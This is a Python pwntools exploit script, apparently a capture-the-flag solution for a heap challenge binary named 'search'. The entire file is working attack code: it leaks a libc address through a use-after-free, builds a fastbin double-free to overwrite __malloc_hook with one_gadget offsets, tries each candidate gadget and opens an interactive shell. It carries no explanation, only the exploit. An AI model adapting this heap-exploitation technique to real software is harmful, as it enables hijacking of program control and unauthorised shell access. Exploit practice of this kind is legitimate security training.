from pwn import *
gadgets=[0x45216,0x4526a,0xcd0f3,0xcd1c8,0xf02a4,0xf02b0,0xf1147,0xf66f0]
for gadget in gadgets:
	target=process('./search')
	elf=ELF('./search')
	libc=elf.libc

	def delete(size,data,option):
		print(target.recvuntil("uit\n"))
		target.sendline("1")
		print(target.recvline())
		target.sendline(str(size))
		print(target.recvline())
		target.send(data)
		print(target.recvuntil(": "))
		leak=target.recvuntil("/n)?")[0:6]
		print(leak)
		libc_leak=u64(leak+"\x00"*2)
		print(hex(libc_leak))
		target.sendline(option)
		print(target.recvline())
		return libc_leak

	def add(size,data):
		print(target.recvuntil("uit\n"))
		target.sendline("2")
		print(target.recvuntil("size:\n"))
		target.sendline(str(size))
		print(target.recvuntil("sentence:\n"))
		target.send(data)
		print(target.recvline())


	#pause()
	add(0x100,"A"*(0x100-0x10-1)+" "+"A"*(0x10))
	delete(0x10,"A"*0x10,"y")
	libc_leak=delete(0x10,"\x00"*0x10,"n")
	libc_base=libc_leak-libc.symbols["__malloc_hook"]-0x68
	libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
	libc_gadget=libc_base+gadget
	print(hex(libc_base))
	add(0x100,"T"*0x100)
	add(0x68,"A"*0x68)
	add(0x68,"B"*0x68)
	add(0x68,"C"*0x68)
	add(0x68,"D"*0x68)
	add(0x68,"E"*0x60+" "+"E"*0x7)
	delete(0x68,"D"*0x68,"y")
	delete(0x60,"E"*0x60,"y")
	delete(0x68,"C"*0x68,"y")
	delete(0x7,"\x00"*0x7,"y")
	add(0x68,p64(libc_malloc_hook-0x23)+"\x00"*(0x68-0x8))
	add(0x68,"F"*0x68)
	add(0x68,"G"*0x68)
	add(0x68,"H"*0x68)
	print(target.recvuntil("uit\n"))
	target.sendline("2")
	print(target.recvuntil("size:\n"))
	target.sendline("0x68")
	print(target.recvuntil("sentence:\n"))
	target.send("I"*0x13+p64(libc_gadget)+"\x00"*(0x68-0x13-0x8))

	target.interactive()
